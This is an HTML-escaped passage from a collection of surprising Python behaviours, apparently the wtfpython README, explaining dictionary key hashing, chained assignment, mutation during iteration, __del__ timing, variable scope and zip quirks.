&#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; type(list(some_dict.keys())[0])&#xA;str&#xA;&amp;gt;&amp;gt;&amp;gt; s = SomeClass(&#39;s&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[s] = 40&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict # expected: Two different keys-value pairs&#xA;{&#39;s&#39;: 40}&#xA;&amp;gt;&amp;gt;&amp;gt; type(list(some_dict.keys())[0])&#xA;str&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Both the object &lt;code&gt;s&lt;/code&gt; and the string &lt;code&gt;&#34;s&#34;&lt;/code&gt; hash to the same value because &lt;code&gt;SomeClass&lt;/code&gt; inherits the &lt;code&gt;__hash__&lt;/code&gt; method of &lt;code&gt;str&lt;/code&gt; class.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;SomeClass(&#34;s&#34;) == &#34;s&#34;&lt;/code&gt; evaluates to &lt;code&gt;True&lt;/code&gt; because &lt;code&gt;SomeClass&lt;/code&gt; also inherits &lt;code&gt;__eq__&lt;/code&gt; method from &lt;code&gt;str&lt;/code&gt; class.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since both the objects hash to the same value and are equal, they are represented by the same key in the dictionary.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For the desired behavior, we can redefine the &lt;code&gt;__eq__&lt;/code&gt; method in &lt;code&gt;SomeClass&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass(str):&#xA;  def __eq__(self, other):&#xA;      return (&#xA;          type(self) is SomeClass&#xA;          and type(other) is SomeClass&#xA;          and super().__eq__(other)&#xA;      )&#xA;&#xA;  # When we define a custom __eq__, Python stops automatically inheriting the&#xA;  # __hash__ method, so we need to define it as well&#xA;  __hash__ = str.__hash__&#xA;&#xA;some_dict = {&#39;s&#39;:42}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; s = SomeClass(&#39;s&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[s] = 40&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{&#39;s&#39;: 40, &#39;s&#39;: 42}&#xA;&amp;gt;&amp;gt;&amp;gt; keys = list(some_dict.keys())&#xA;&amp;gt;&amp;gt;&amp;gt; type(keys[0]), type(keys[1])&#xA;(__main__.SomeClass, str)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s see if you can guess this?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 81aa9fbe-bd63-4283-b56d-6fdd14c9105e ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a, b = a[b] = {}, 5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;{5: ({...}, 5)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;According to &lt;a href=&#34;https://docs.python.org/3/reference/simple_stmts.html#assignment-statements&#34;&gt;Python language reference&lt;/a&gt;, assignment statements have the form &lt;pre&gt;&lt;code&gt;(target_list &#34;=&#34;)+ (expression_list | yield_expression)&#xA;&lt;/code&gt;&lt;/pre&gt; and&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;An assignment statement evaluates the expression list (remember that this can be a single expression or a comma-separated list, the latter yielding a tuple) and assigns the single resulting object to each of the target lists, from left to right.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;+&lt;/code&gt; in &lt;code&gt;(target_list &#34;=&#34;)+&lt;/code&gt; means there can be &lt;strong&gt;one or more&lt;/strong&gt; target lists. In this case, target lists are &lt;code&gt;a, b&lt;/code&gt; and &lt;code&gt;a[b]&lt;/code&gt; (note the expression list is exactly one, which in our case is &lt;code&gt;{}, 5&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;After the expression list is evaluated, its value is unpacked to the target lists from &lt;strong&gt;left to right&lt;/strong&gt;. So, in our case, first the &lt;code&gt;{}, 5&lt;/code&gt; tuple is unpacked to &lt;code&gt;a, b&lt;/code&gt; and we now have &lt;code&gt;a = {}&lt;/code&gt; and &lt;code&gt;b = 5&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;a&lt;/code&gt; is now assigned to &lt;code&gt;{}&lt;/code&gt;, which is a mutable object.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The second target list is &lt;code&gt;a[b]&lt;/code&gt; (you may expect this to throw an error because both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; have not been defined in the statements before. But remember, we just assigned &lt;code&gt;a&lt;/code&gt; to &lt;code&gt;{}&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; to &lt;code&gt;5&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Now, we are setting the key &lt;code&gt;5&lt;/code&gt; in the dictionary to the tuple &lt;code&gt;({}, 5)&lt;/code&gt; creating a circular reference (the &lt;code&gt;{...}&lt;/code&gt; in the output refers to the same object that &lt;code&gt;a&lt;/code&gt; is already referencing). Another simpler example of circular reference could be&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = some_list[0] = [0]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list&#xA;[[...]]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[0]&#xA;[[...]]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list is some_list[0]&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[0][0][0][0][0][0] == some_list&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Similar is the case in our example (&lt;code&gt;a[b][0]&lt;/code&gt; is the same object as &lt;code&gt;a&lt;/code&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So to sum it up, you can break the example down to&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a, b = {}, 5&#xA;a[b] = a, b&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;And the circular reference can be justified by the fact that &lt;code&gt;a[b][0]&lt;/code&gt; is the same object as &lt;code&gt;a&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a[b][0] is a&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Slippery Slopes&lt;/h2&gt; &#xA;&lt;h3&gt;▶ Modifying a dictionary while iterating over it&lt;/h3&gt; &#xA;&lt;!-- Example ID: b4e5cdfb-c3a8-4112-bd38-e2356d801c41 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = {0: None}&#xA;&#xA;for i in x:&#xA;    del x[i]&#xA;    x[i+1] = None&#xA;    print(i)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.7- Python 3.5):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0&#xA;1&#xA;2&#xA;3&#xA;4&#xA;5&#xA;6&#xA;7&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Yes, it runs for exactly &lt;strong&gt;eight&lt;/strong&gt; times and stops.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Iteration over a dictionary that you edit at the same time is not supported.&lt;/li&gt; &#xA; &lt;li&gt;It runs eight times because that&#39;s the point at which the dictionary resizes to hold more keys (we have eight deletion entries, so a resize is needed). This is actually an implementation detail.&lt;/li&gt; &#xA; &lt;li&gt;How deleted keys are handled and when the resize occurs might be different for different Python implementations.&lt;/li&gt; &#xA; &lt;li&gt;So for Python versions other than Python 2.7 - Python 3.5, the count might be different from 8 (but whatever the count is, it&#39;s going to be the same every time you run it). You can find some discussion around this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/53&#34;&gt;here&lt;/a&gt; or in &lt;a href=&#34;https://stackoverflow.com/questions/44763802/bug-in-python-dict&#34;&gt;this&lt;/a&gt; StackOverflow thread.&lt;/li&gt; &#xA; &lt;li&gt;Python 3.7.6 onwards, you&#39;ll see &lt;code&gt;RuntimeError: dictionary keys changed during iteration&lt;/code&gt; exception if you try to do this.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Stubborn &lt;code&gt;del&lt;/code&gt; operation&lt;/h3&gt; &#xA;&lt;!-- Example ID: 777ed4fd-3a2d-466f-95e7-c4058e61d78e ---&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    def __del__(self):&#xA;        print(&#34;Deleted!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; 1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; y = x&#xA;&amp;gt;&amp;gt;&amp;gt; del x # this should print &#34;Deleted!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; del y&#xA;Deleted!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Phew, deleted at last. You might have guessed what saved &lt;code&gt;__del__&lt;/code&gt; from being called in our first attempt to delete &lt;code&gt;x&lt;/code&gt;. Let&#39;s add more twists to the example.&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; y = x&#xA;&amp;gt;&amp;gt;&amp;gt; del x&#xA;&amp;gt;&amp;gt;&amp;gt; y # check if y exists&#xA;&amp;lt;__main__.SomeClass instance at 0x7f98a1a67fc8&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; del y # Like previously, this should print &#34;Deleted!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; globals() # oh, it didn&#39;t. Let&#39;s check all our global variables and confirm&#xA;Deleted!&#xA;{&#39;__builtins__&#39;: &amp;lt;module &#39;__builtin__&#39; (built-in)&amp;gt;, &#39;SomeClass&#39;: &amp;lt;class __main__.SomeClass at 0x7f98a1a5f668&amp;gt;, &#39;__package__&#39;: None, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Okay, now it&#39;s deleted &lt;span&gt;😕&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;del x&lt;/code&gt; doesn’t directly call &lt;code&gt;x.__del__()&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;del x&lt;/code&gt; is encountered, Python deletes the name &lt;code&gt;x&lt;/code&gt; from current scope and decrements by 1 the reference count of the object &lt;code&gt;x&lt;/code&gt; referenced. &lt;code&gt;__del__()&lt;/code&gt; is called only when the object&#39;s reference count reaches zero.&lt;/li&gt; &#xA; &lt;li&gt;In the second output snippet, &lt;code&gt;__del__()&lt;/code&gt; was not called because the previous statement (&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; y&lt;/code&gt;) in the interactive interpreter created another reference to the same object (specifically, the &lt;code&gt;_&lt;/code&gt; magic variable which references the result value of the last non &lt;code&gt;None&lt;/code&gt; expression on the REPL), thus preventing the reference count from reaching zero when &lt;code&gt;del y&lt;/code&gt; was encountered.&lt;/li&gt; &#xA; &lt;li&gt;Calling &lt;code&gt;globals&lt;/code&gt; (or really, executing anything that will have a non &lt;code&gt;None&lt;/code&gt; result) caused &lt;code&gt;_&lt;/code&gt; to reference the new result, dropping the existing reference. Now the reference count reached 0 and we can see &#34;Deleted!&#34; being printed (finally!).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The out of scope variable&lt;/h3&gt; &#xA;&lt;!-- Example ID: 75c03015-7be9-4289-9e22-4f5fdda056f7 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = 1&#xA;def some_func():&#xA;    return a&#xA;&#xA;def another_func():&#xA;    a += 1&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_closure_func():&#xA;    a = 1&#xA;    def some_inner_func():&#xA;        return a&#xA;    return some_inner_func()&#xA;&#xA;def another_closure_func():&#xA;    a = 1&#xA;    def another_inner_func():&#xA;        a += 1&#xA;        return a&#xA;    return another_inner_func()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;UnboundLocalError: local variable &#39;a&#39; referenced before assignment&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; some_closure_func()&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_closure_func()&#xA;UnboundLocalError: local variable &#39;a&#39; referenced before assignment&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When you make an assignment to a variable in scope, it becomes local to that scope. So &lt;code&gt;a&lt;/code&gt; becomes local to the scope of &lt;code&gt;another_func&lt;/code&gt;, but it has not been initialized previously in the same scope, which throws an error.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To modify the outer scope variable &lt;code&gt;a&lt;/code&gt; in &lt;code&gt;another_func&lt;/code&gt;, we have to use the &lt;code&gt;global&lt;/code&gt; keyword.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def another_func()&#xA;    global a&#xA;    a += 1&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In &lt;code&gt;another_closure_func&lt;/code&gt;, &lt;code&gt;a&lt;/code&gt; becomes local to the scope of &lt;code&gt;another_inner_func&lt;/code&gt;, but it has not been initialized previously in the same scope, which is why it throws an error.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To modify the outer scope variable &lt;code&gt;a&lt;/code&gt; in &lt;code&gt;another_inner_func&lt;/code&gt;, use the &lt;code&gt;nonlocal&lt;/code&gt; keyword. The nonlocal statement is used to refer to variables defined in the nearest outer (excluding the global) scope.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def another_func():&#xA;    a = 1&#xA;    def another_inner_func():&#xA;        nonlocal a&#xA;        a += 1&#xA;        return a&#xA;    return another_inner_func()&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The keywords &lt;code&gt;global&lt;/code&gt; and &lt;code&gt;nonlocal&lt;/code&gt; tell the python interpreter to not declare new variables and look them up in the corresponding outer scopes.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Read &lt;a href=&#34;https://sebastianraschka.com/Articles/2014_python_scope_and_namespaces.html&#34;&gt;this&lt;/a&gt; short but an awesome guide to learn more about how namespaces and scope resolution works in Python.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Deleting a list item while iterating&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4cc52d4e-d42b-4e09-b25f-fbf5699b7d4e ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;list_1 = [1, 2, 3, 4]&#xA;list_2 = [1, 2, 3, 4]&#xA;list_3 = [1, 2, 3, 4]&#xA;list_4 = [1, 2, 3, 4]&#xA;&#xA;for idx, item in enumerate(list_1):&#xA;    del item&#xA;&#xA;for idx, item in enumerate(list_2):&#xA;    list_2.remove(item)&#xA;&#xA;for idx, item in enumerate(list_3[:]):&#xA;    list_3.remove(item)&#xA;&#xA;for idx, item in enumerate(list_4):&#xA;    list_4.pop(idx)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list_1&#xA;[1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; list_2&#xA;[2, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; list_3&#xA;[]&#xA;&amp;gt;&amp;gt;&amp;gt; list_4&#xA;[2, 4]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Can you guess why the output is &lt;code&gt;[2, 4]&lt;/code&gt;?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;It&#39;s never a good idea to change the object you&#39;re iterating over. The correct way to do so is to iterate over a copy of the object instead, and &lt;code&gt;list_3[:]&lt;/code&gt; does just that.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; id(some_list)&#xA;139798789457608&#xA;&amp;gt;&amp;gt;&amp;gt; id(some_list[:]) # Notice that python creates new object for sliced list.&#xA;139798779601192&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Difference between &lt;code&gt;del&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;, and &lt;code&gt;pop&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;del var_name&lt;/code&gt; just removes the binding of the &lt;code&gt;var_name&lt;/code&gt; from the local or global namespace (That&#39;s why the &lt;code&gt;list_1&lt;/code&gt; is unaffected).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;remove&lt;/code&gt; removes the first matching value, not a specific index, raises &lt;code&gt;ValueError&lt;/code&gt; if the value is not found.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;pop&lt;/code&gt; removes the element at a specific index and returns it, raises &lt;code&gt;IndexError&lt;/code&gt; if an invalid index is specified.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Why the output is &lt;code&gt;[2, 4]&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The list iteration is done index by index, and when we remove &lt;code&gt;1&lt;/code&gt; from &lt;code&gt;list_2&lt;/code&gt; or &lt;code&gt;list_4&lt;/code&gt;, the contents of the lists are now &lt;code&gt;[2, 3, 4]&lt;/code&gt;. The remaining elements are shifted down, i.e., &lt;code&gt;2&lt;/code&gt; is at index 0, and &lt;code&gt;3&lt;/code&gt; is at index 1. Since the next iteration is going to look at index 1 (which is the &lt;code&gt;3&lt;/code&gt;), the &lt;code&gt;2&lt;/code&gt; gets skipped entirely. A similar thing will happen with every alternate element in the list sequence.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Refer to this StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/45946228/what-happens-when-you-try-to-delete-a-list-element-while-iterating-over-it&#34;&gt;thread&lt;/a&gt; explaining the example&lt;/li&gt; &#xA; &lt;li&gt;See also this nice StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/45877614/how-to-change-all-the-dictionary-keys-in-a-for-loop-with-d-items&#34;&gt;thread&lt;/a&gt; for a similar example related to dictionaries in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Lossy zip of iterators *&lt;/h3&gt; &#xA;&lt;!-- Example ID: c28ed154-e59f-4070-8eb6-8967a4acac6d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; numbers = list(range(7))&#xA;&amp;gt;&amp;gt;&amp;gt; numbers&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&amp;gt;&amp;gt;&amp;gt; first_three, remaining = numbers[:3], numbers[3:]&#xA;&amp;gt;&amp;gt;&amp;gt; first_three, remaining&#xA;([0, 1, 2], [3, 4, 5, 6])&#xA;&amp;gt;&amp;gt;&amp;gt; numbers_iter = iter(numbers)&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(numbers_iter, first_three)) &#xA;[(0, 0), (1, 1), (2, 2)]&#xA;# so far so good, let&#39;s zip the remaining&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(numbers_iter, remaining))&#xA;[(4, 3), (5, 4), (6, 5)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where did element &lt;code&gt;3&lt;/code&gt; go from the &lt;code&gt;numbers&lt;/code&gt; list?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;From Python &lt;a href=&#34;https://docs.python.org/3.3/library/functions.html#zip&#34;&gt;docs&lt;/a&gt;, here&#39;s an approximate implementation of zip function, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def zip(*iterables):&#xA;    sentinel = object()&#xA;    iterators = [iter(it) for it in iterables]&#xA;    while iterators:&#xA;        result = []&#xA;        for it in iterators:&#xA;            elem = next(it, sentinel)&#xA;            if elem is sentinel: return&#xA;            result.append(elem)&#xA;        yield tuple(result)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;So the function takes in arbitrary number of iterable objects, adds each of their items to the &lt;code&gt;result&lt;/code&gt; list by calling the &lt;code&gt;next&lt;/code&gt; function on them, and stops whenever any of the iterable is exhausted.&lt;/li&gt; &#xA; &lt;li&gt;The caveat here is when any iterable is exhausted, the existing elements in the &lt;code&gt;result&lt;/code&gt; list are discarded. That&#39;s what happened with &lt;code&gt;3&lt;/code&gt; in the &lt;code&gt;numbers_iter&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The correct way to do the above using &lt;code&gt;zip&lt;/code&gt; would be, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; numbers = list(range(7))&#xA;&amp;gt;&amp;gt;&amp;gt; numbers_iter = iter(numbers)&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(first_three, numbers_iter))&#xA;[(0, 0), (1, 1), (2, 2)]&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(remaining, numbers_iter))&#xA;[(3, 3), (4, 4), (5, 5), (6, 6)]&#xA;&lt;/code&gt;&lt;/pre&gt; The first argument of zip should be the one with fewest elements.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Loop variables leaking out!&lt;/h3&gt; &#xA;&lt;!-- Example ID: ccec7bf6-7679-4963-907a-1cd8587be9ea ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for x in range(7):&#xA;    if x == 6:&#xA;        print(x, &#39;: for x inside loop&#39;)&#xA;print(x, &#39;: x in global&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;6 : for x inside loop&#xA;6 : x in global&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But &lt;code&gt;x&lt;/code&gt; was never defined outside the scope of for loop...&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# This time let&#39;s initialize x first&#xA;x = -1&#xA;for x in range(7):&#xA;    if x == 6:&#xA;        print(x, &#39;: for x inside loop&#39;)&#xA;print(x, &#39;: x in global&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;6 : for x inside loop&#xA;6 : x in global&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 1&#xA;&amp;gt;&amp;gt;&amp;gt; print([x for x in range(5)])&#xA;[0, 1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; print(x)&#xA;4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 1&#xA;&amp;gt;&amp;gt;&amp;gt; print([x for x in range(5)])&#xA;[0, 1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; print(x)&#xA;1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In Python, for-loops use the scope they exist in and leave their defined loop-variable behind. This also applies if we explicitly defined the for-loop variable in the global namespace before. In this case, it will rebind the existing variable.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The differences in the output of Python 2.x and Python 3.x interpreters for list comprehension example can be explained by following change documented in &lt;a href=&#34;https://docs.python.org/3/whatsnew/3.0.html&#34;&gt;What’s New In Python 3.0&lt;/a&gt; changelog:&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;&#34;List comprehensions no longer support the syntactic form &lt;code&gt;[... for var in item1, item2, ...]&lt;/code&gt;. Use &lt;code&gt;[... for var in (item1, item2, ...)]&lt;/code&gt; instead. Also, note that list comprehensions have different semantics: they are closer to syntactic sugar for a generator expression inside a &lt;code&gt;list()&lt;/code&gt; constructor, and in particular, the loop control variables are no longer leaked into the surrounding scope.&#34;&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Beware of default mutable arguments!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7d42dade-e20d-4a7b-9ed7-16fb58505fe9 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=[]):&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; 